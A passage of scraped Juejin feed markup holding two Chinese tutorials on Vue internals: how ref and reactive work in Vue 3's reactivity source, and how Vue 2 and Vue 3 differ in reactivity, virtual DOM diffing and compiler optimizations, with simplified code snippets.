hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​
这是一个非常硬核且高质量的问题。要理解 Vue 3 的响应式系统，必须深入到源码层面。</p>
<p>首先，我需要纠正一个重要的误区：<strong>Vue 3 并没有“弃用” <code>reactive</code></strong> 。它仍然是 Vue 3 核心 API 的一部分。但是，确实存在一种趋势（包括 Vue 官方团队的建议），<strong>推荐优先使用 <code>ref</code></strong> 。</p>
<p>下面我将从源码级别（基于 Vue 3 <code>packages/reactivity</code> 模块）为你详细剖析两者的原理、区别，以及为什么现在大家更倾向于用 <code>ref</code>。</p>
<hr/>
<h3 data-id="heading-0">一、 <code>reactive</code> 的源码工作原理</h3>
<p><code>reactive</code> 的核心是利用了 ES6 的 <strong><code>Proxy</code></strong> 对象。它拦截对象的操作（增删改查），从而实现依赖收集和触发更新。</p>
<h4 data-id="heading-1">1. 核心流程 (<code>reactive.ts</code>)</h4>
<p>当你调用 <code>reactive(obj)</code> 时，Vue 内部实际上执行了 <code>createReactiveObject</code> 函数。</p>
<p><strong>简化版源码逻辑：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 存放代理对象的缓存，防止同一个对象被代理多次</span>
<span class="hljs-keyword">const</span> reactiveMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();

<span class="hljs-keyword">function</span> <span class="hljs-title function_">createReactiveObject</span>(<span class="hljs-params">target</span>) {
  <span class="hljs-comment">// 1. 如果不是对象（是基础类型），直接返回，无法代理</span>
  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isObject</span>(target)) {
    <span class="hljs-keyword">return</span> target;
  }

  <span class="hljs-comment">// 2. 检查缓存，如果已经代理过，直接返回缓存的 Proxy</span>
  <span class="hljs-keyword">if</span> (reactiveMap.<span class="hljs-title function_">has</span>(target)) {
    <span class="hljs-keyword">return</span> reactiveMap.<span class="hljs-title function_">get</span>(target);
  }

  <span class="hljs-comment">// 3. 创建 Proxy</span>
  <span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, mutableHandlers);

  <span class="hljs-comment">// 4. 存入缓存</span>
  reactiveMap.<span class="hljs-title function_">set</span>(target, proxy);
  
  <span class="hljs-keyword">return</span> proxy;
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-2">2. 拦截器 (<code>baseHandlers.ts</code>)</h4>
<p>Proxy 的威力在于第二个参数 <code>mutableHandlers</code>。它定义了 <code>get</code>（读取）和 <code>set</code>（修改）的拦截行为。</p>
<ul>
<li><strong>get (依赖收集)</strong> ：当副作用函数（Effect，如 computed 或 render）读取属性时，触发 <code>track</code> 函数，将当前 Effect 记录下来。</li>
<li><strong>set (派发更新)</strong> ：当修改属性时，触发 <code>trigger</code> 函数，找到之前收集的 Effect 并执行它们。</li>
</ul>
<p><strong>简化版 Handler 逻辑：</strong></p>
<pre><code class="hljs language-scss" lang="scss">const mutableHandlers = {
  <span class="hljs-built_in">get</span>(target, key, receiver) {
    <span class="hljs-comment">// 1. 收集依赖</span>
    <span class="hljs-built_in">track</span>(target, key);
    
    <span class="hljs-comment">// 2. 获取原本的值</span>
    const res = Reflect<span class="hljs-selector-class">.get</span>(target, key, receiver);

    <span class="hljs-comment">// 3. 【深度响应关键点】如果获取到的 res 是对象，递归将其转为 reactive</span>
    <span class="hljs-comment">// 这与 Vue 2 不同，Vue 3 是懒代理（访问时才代理），性能更好</span>
    if (isObject(res)) {
      return <span class="hljs-built_in">reactive</span>(res); 
    }
    
    return res;
  },
  
  <span class="hljs-built_in">set</span>(target, key, value, receiver) {
    <span class="hljs-comment">// 1. 获取旧值</span>
    const oldValue = target<span class="hljs-selector-attr">[key]</span>;
    <span class="hljs-comment">// 2. 设置新值</span>
    const result = Reflect<span class="hljs-selector-class">.set</span>(target, key, value, receiver);
    
    <span class="hljs-comment">// 3. 如果值发生变化，触发更新</span>
    if (hasChanged(value, oldValue)) {
      <span class="hljs-built_in">trigger</span>(target, key);
    }
    
    return result;
  }
};
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-3">二、 <code>ref</code> 的源码工作原理</h3>
<p><code>ref</code> 的设计初衷是为了解决 <strong>基本数据类型（Primitives）</strong> 无法使用 <code>Proxy</code> 代理的问题（Proxy 只能代理对象）。</p>
<h4 data-id="heading-4">1. 核心流程 (<code>ref.ts</code>)</h4>
<p><code>ref</code> 本质上是一个 <strong>对象的包装器</strong>。它通过定义一个类 <code>RefImpl</code>，利用 ES6 的类属性访问器（getter/setter）来拦截 <code>.value</code> 的访问。</p>
<p><strong>简化版源码逻辑：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">function ref(value) {
  <span class="hljs-keyword">return</span> createRef(value);
}

function createRef(rawValue) {
  <span class="hljs-keyword">if</span> (isRef(rawValue)) <span class="hljs-keyword">return</span> rawValue;
  <span class="hljs-keyword">return</span> new RefImpl(rawValue);
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">RefImpl</span> {
  <span class="hljs-keyword">public</span> _value; <span class="hljs-comment">// 存储当前值</span>
  <span class="hljs-keyword">public</span> _rawValue; <span class="hljs-comment">// 存储原始值（用于比较）</span>
  <span class="hljs-keyword">public</span> dep; <span class="hljs-comment">// 依赖容器</span>
  <span class="hljs-keyword">public</span> __v_isRef = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 标记这是一个 Ref</span>

  <span class="hljs-keyword">constructor</span>(value) {
    <span class="hljs-keyword">this</span>._rawValue = value;
    <span class="hljs-comment">// 核心差异点：如果传入的是对象，内部会自动调用 reactive()！</span>
    <span class="hljs-keyword">this</span>._value = isObject(value) ? reactive(value) : value;
  }

  <span class="hljs-keyword">get</span> value() {
    <span class="hljs-comment">// 1. 收集依赖</span>
    trackRefValue(<span class="hljs-keyword">this</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>._value;
  }

  <span class="hljs-keyword">set</span> value(newVal) {
    <span class="hljs-comment">// 2. 检查值是否变化</span>
    <span class="hljs-keyword">if</span> (hasChanged(newVal, <span class="hljs-keyword">this</span>._rawValue)) {
      <span class="hljs-keyword">this</span>._rawValue = newVal;
      <span class="hljs-comment">// 如果新赋的值是对象，再次转为 reactive</span>
      <span class="hljs-keyword">this</span>._value = isObject(newVal) ? reactive(newVal) : newVal;
      <span class="hljs-comment">// 3. 触发更新</span>
      triggerRefValue(<span class="hljs-keyword">this</span>);
    }
  }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>重点总结</strong>：</p>
<ul>
<li>如果 <code>ref(10)</code>：利用 <code>RefImpl</code> 的 <code>get value</code> 和 <code>set value</code> 进行拦截。</li>
<li>如果 <code>ref({ count: 1 })</code>：<code>RefImpl</code> 会将内部的 <code>value</code> 变成 <code>reactive({ count: 1 })</code> 的 Proxy 对象。</li>
</ul>
<hr/>
<h3 data-id="heading-5">三、 Ref 与 Reactive 的关键区别</h3>



































<table><thead><tr><th>特性</th><th>Ref</th><th>Reactive</th></tr></thead><tbody><tr><td><strong>数据类型</strong></td><td>支持所有类型（基本类型 + 对象）。</td><td><strong>仅支持对象</strong>（Array, Object, Map, Set）。</td></tr><tr><td><strong>底层原理</strong></td><td><code>RefImpl</code> 类（getter/setter）。如果是对象，内部转调 <code>reactive</code>。</td><td>直接使用 <code>Proxy</code>。</td></tr><tr><td><strong>访问方式</strong></td><td>必须通过 <strong><code>.value</code></strong> 访问（模板中自动解包除外）。</td><td>直接访问属性。</td></tr><tr><td><strong>重新赋值</strong></td><td><code>myRef.value = {}</code> 依然保持响应式。</td><td><code>let state = reactive({}); state = {}</code> <strong>会丢失响应性</strong>。</td></tr><tr><td><strong>结构解构</strong></td><td>解构会丢失响应性（需用 <code>toRefs</code>）。</td><td>解构会丢失响应性（需用 <code>toRefs</code>）。</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-6">四、 为什么说 Vue 3 “想弃用” reactive（实际上是推荐 ref）？</h3>
<p>这是一个由 <strong>“开发者体验（DX）”</strong> 驱动的趋势。虽然 <code>reactive</code> 并没有被官方删除，但社区和尤雨溪（Evan You）都倾向于 <strong>“Ref 一把梭”</strong> ，主要原因如下：</p>
<h4 data-id="heading-7">1. <code>reactive</code> 的局限性会导致 Bug</h4>
<p>Vue 新手最常遇到的坑就是 <code>reactive</code> 丢失响应性：</p>
<ul>
<li>
<p><strong>赋值替换问题</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">list</span> = reactive([])<span class="hljs-comment">;</span>
// 错误！这样赋值会切断 Proxy 的连接，页面不会更新
<span class="hljs-attr">list</span> = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<span class="hljs-comment">; </span>

// 正确写法（很麻烦）
list.push(...<span class="hljs-section">[1, 2, 3]</span>)<span class="hljs-comment">;</span>
// 或者再包一层
const <span class="hljs-attr">state</span> = reactive({ list: [] })<span class="hljs-comment">;</span>
<span class="hljs-attr">state.list</span> = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<span class="hljs-comment">;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>而 <code>ref</code> 没有这个问题：<code>list.value = [1, 2, 3]</code> 总是安全的。</p>
</li>
<li>
<p><strong>解构丢失问题</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">state</span> = reactive({ count: <span class="hljs-number">0</span> })<span class="hljs-comment">;</span>
let { count } = state<span class="hljs-comment">; // count 变成了普通数字，不再是响应式的</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
</li>
</ul>
<h4 data-id="heading-8">2. 类型不一致带来的心智负担</h4>
<p>在一个组件中，如果混用两者：</p>
<ul>
<li>有些变量直接读（reactive）。</li>
<li>有些变量要加 <code>.value</code>（ref）。</li>
<li>有些对象是通过 <code>props</code> 传进来的，你不知道它是普通对象还是 Proxy。</li>
</ul>
<p><strong>使用 <code>ref</code> 可以统一心智模型</strong>：</p>
<ul>
<li>在 JS 代码中，<strong>凡是响应式数据，都要带 <code>.value</code></strong> 。这种显式调用虽然写起来多几个字符，但让代码更清晰，更容易区分哪些是普通变量，哪些是响应式变量。</li>
</ul>
<h4 data-id="heading-9">3. 官方的态度</h4>
<p>尤雨溪曾在社区讨论中表示，如果 Vue 3 重新设计，也许会只保留 <code>ref</code>。虽然 <code>reactive</code> 为了 API 的完整性被保留了，但在实际业务开发中，<strong>全量使用 <code>ref</code></strong> 是目前最推荐的最佳实践。</p>
<h3 data-id="heading-10">总结</h3>
<ul>
<li><strong>Reactive</strong>: 基于 <code>Proxy</code>，只对对象有效，存在解构和重新赋值丢失响应性的风险。</li>
<li><strong>Ref</strong>: 基于 <code>class</code> 的 getter/setter，统一了基本类型和对象的处理（对象内部调用 reactive）。</li>
<li><strong>结论</strong>: 建议在项目中优先使用 <strong><code>ref</code></strong> 。它更加稳健，不易出错，且能够清晰地标识出“这是一个响应式数据”。</li>
</ul>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[详细说说vue2何vue3的工作原理以及区别？为什么vue3会做此升级？]]></title>    <link>https://juejin.cn/post/7581789701531729962</link>    <guid>https://juejin.cn/post/7581789701531729962</guid>    <pubDate>2025-12-10T03:46:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581789701531729962" data-draft-id="7579169543232684032" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="详细说说vue2何vue3的工作原理以及区别？为什么vue3会做此升级？"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-10T03:46:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户7700362205757"/> <meta itemprop="url" content="https://juejin.cn/user/1775053506361337"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            详细说说vue2何vue3的工作原理以及区别？为什么vue3会做此升级？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1775053506361337/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户7700362205757
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:46:19.000Z" title="Wed Dec 10 2025 03:46:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    13
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​这是一个非常有分量的架构级问题。要讲清楚 Vue 2 到 Vue 3 的演进，我们需要从底层的响应式原理、虚拟 DOM (Virtual DOM) 的编译策略以及运行时性能三个维度深入剖析。</p>
<p>以下是从源码和架构设计层面的详细解读：</p>
<hr/>
<h3 data-id="heading-0">一、 什么是虚拟 DOM (Virtual DOM)？</h3>
<p>在理解 Vue 原理之前，必须先理解虚拟 DOM。</p>
<p><strong>1. 定义：</strong><br/>
虚拟 DOM 本质上是一个 <strong>JavaScript 对象（VNode）</strong> ，它是真实 DOM 的“蓝图”或“替身”。</p>
<p><strong>2. 为什么需要它？</strong></p>
<ul>
<li><strong>操作真实 DOM 代价高昂</strong>：真实 DOM 节点非常重（包含大量属性和事件）。频繁操作 DOM 会导致浏览器频繁重排（Reflow）和重绘（Repaint），性能极差。</li>
<li><strong>JS 计算很快</strong>：在 JS 层面通过对比两个对象（新旧 VNode）的差异（Diff），计算出最小的更变操作，然后再去更新真实 DOM，效率最高。</li>
</ul>
<p><strong>3. 结构示例：</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 真实 DOM: &lt;div class="box"&gt;Hello&lt;/div&gt;</span>
<span class="hljs-comment">// 虚拟 DOM (VNode):</span>
<span class="hljs-type">const</span> vnode = {
  tag: <span class="hljs-string">'div'</span>,
  props: { <span class="hljs-keyword">class</span>: <span class="hljs-string">'box'</span> },
  children: <span class="hljs-string">'Hello'</span>,
  <span class="hljs-comment">// Vue3 新增了 patchFlag 等编译优化标记</span>
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-1">二、 Vue 2 的工作原理</h3>
<p>Vue 2 的核心是 <strong>Options API</strong> 和基于 <strong><code>Object.defineProperty</code></strong> 的响应式系统。</p>
<h4 data-id="heading-2">1. 响应式原理 (Reactivity)</h4>
<p>Vue 2 在初始化（<code>initState</code>）时，会递归遍历 <code>data</code> 中的所有属性。</p>
<ul>
<li>
<p><strong>核心 API</strong>：<code>Object.defineProperty</code></p>
</li>
<li>
<p><strong>源码逻辑</strong>：</p>
<ul>
<li><strong>Observer（观察者）</strong> ：递归把对象属性转为 getter/setter。</li>
<li><strong>Dep（依赖容器）</strong> ：每个属性闭包里都有一个 <code>Dep</code> 实例，用来存放到到底谁用了我。</li>
<li><strong>Watcher（订阅者）</strong> ：组件渲染函数、computed、watch 都是 Watcher。</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-ini" lang="ini">// Vue 2 响应式简化版
Object.defineProperty(obj, key, {
  get() {
    // 1. 依赖收集：如果当前有正在计算的 Watcher，就把它收集进 Dep
    if (Dep.target) dep.depend()<span class="hljs-comment">;</span>
    return value<span class="hljs-comment">;</span>
  },
  set(newVal) {
    if (<span class="hljs-attr">newVal</span> === value) return<span class="hljs-comment">;</span>
    <span class="hljs-attr">value</span> = newVal<span class="hljs-comment">;</span>
    // 2. 派发更新：通知 Dep 里所有的 Watcher 去 update
    dep.notify()<span class="hljs-comment">;</span>
  }
})<span class="hljs-comment">;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-3">2. Vue 2 的痛点</h4>
<ol>
<li><strong>初始化慢</strong>：因为是<strong>递归</strong>遍历，如果 <code>data</code> 对象很大，启动（Init）阶段会非常耗时，且内存占用高。</li>
<li><strong>动态性不足</strong>：无法监听对象属性的新增（add）和删除（delete），必须用 <code>$set</code> / <code>$delete</code>。</li>
<li><strong>数组限制</strong>：无法拦截数组索引修改（<code>arr[0] = 1</code>），Vue 2 重写了数组的 7 个变异方法（push, pop...）来实现响应式。</li>
</ol>
<h4 data-id="heading-4">3. 虚拟 DOM 与 Diff (Vue 2)</h4>
<p>Vue 2 的 Diff 算法是 <strong>全量对比</strong>。<br/>
当数据变化时，Vue 2 会重新生成整个组件的 VNode 树，然后和旧的 VNode 树进行对比（双端比较算法）。即使有些节点及其子节点永远不会变（静态节点），Vue 2 依然会去比对它们。</p>
<hr/>
<h3 data-id="heading-5">三、 Vue 3 的工作原理</h3>
<p>Vue 3 在响应式系统和编译优化上做了彻底的重构。</p>
<h4 data-id="heading-6">1. 响应式原理 (Reactivity)</h4>
<p>Vue 3 使用 <strong>Proxy</strong> 替代了 <code>defineProperty</code>。代码位于 <code>packages/reactivity</code>。</p>
<ul>
<li>
<p><strong>核心 API</strong>：<code>Proxy</code> + <code>Reflect</code></p>
</li>
<li>
<p><strong>源码逻辑</strong>：</p>
<ul>
<li>不再需要 <code>Observer</code> 类，直接返回一个 Proxy 代理。</li>
<li><strong>Track（依赖收集）</strong> ：当读取属性时触发 <code>track(target, key)</code>，将副作用函数（Effect）存入全局的 <code>WeakMap</code>。</li>
<li><strong>Trigger（派发更新）</strong> ：当修改属性时触发 <code>trigger(target, key)</code>，从 <code>WeakMap</code> 取出 Effect 执行。</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Vue 3 响应式简化版</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, {
  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, key, receiver</span>) {
    <span class="hljs-title function_">track</span>(target, key); <span class="hljs-comment">// 收集依赖</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key, receiver);
  },
  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, key, value, receiver</span>) {
    <span class="hljs-keyword">const</span> res = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, key, value, receiver);
    <span class="hljs-title function_">trigger</span>(target, key); <span class="hljs-comment">// 触发更新</span>
    <span class="hljs-keyword">return</span> res;
  }
})
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<ul>
<li>
<p><strong>优势</strong>：</p>
<ul>
<li><strong>懒代理（Lazy）</strong> ：只有访问到深层对象时，才会将其转为 Proxy，初始化飞快。</li>
<li><strong>全能拦截</strong>：支持新增、删除属性，支持数组索引修改，支持 Map/Set。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-7">2. 编译优化 (Compiler Optimization) —— 核心升级</h4>
<p>Vue 3 的 Diff 算法不仅仅是快，而是**“更聪明”** 。它在<strong>编译阶段（Template -&gt; Render Function）</strong> 做了大量标记，让<strong>运行时（Runtime）</strong> 跑得更快。</p>
<ul>
<li>
<p><strong>PatchFlags (动态标记)</strong> ：<br/>
在编译时，Vue 3 会分析模板，给动态节点打上“二进制标记”。<br/>
比如：<code>&lt;div :class="cls"&gt;123&lt;/div&gt;</code>。<br/>
Vue 3 知道只有 <code>class</code> 是动态的，Diff 时<strong>只对比 <code>class</code></strong> ，完全忽略内容。</p>
</li>
<li>
<p><strong>Block Tree (区块树)</strong> ：<br/>
Vue 3 将模板切分成 Block，配合 PatchFlags，Diff 时<strong>直接跳过静态节点</strong>，只遍历动态节点数组。</p>
<ul>
<li>Vue 2 Diff 复杂度 = 模板总体积</li>
<li>Vue 3 Diff 复杂度 = 动态节点的数量</li>
</ul>
</li>
<li>
<p><strong>Hoist Static (静态提升)</strong> ：<br/>
静态的节点（如 <code>&lt;p&gt;永远不变&lt;/p&gt;</code>）在内存中只创建一次，后续更新直接复用，不再重复创建 VNode。</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-8">四、 Vue 2 和 Vue 3 的比较与区别</h3>


















































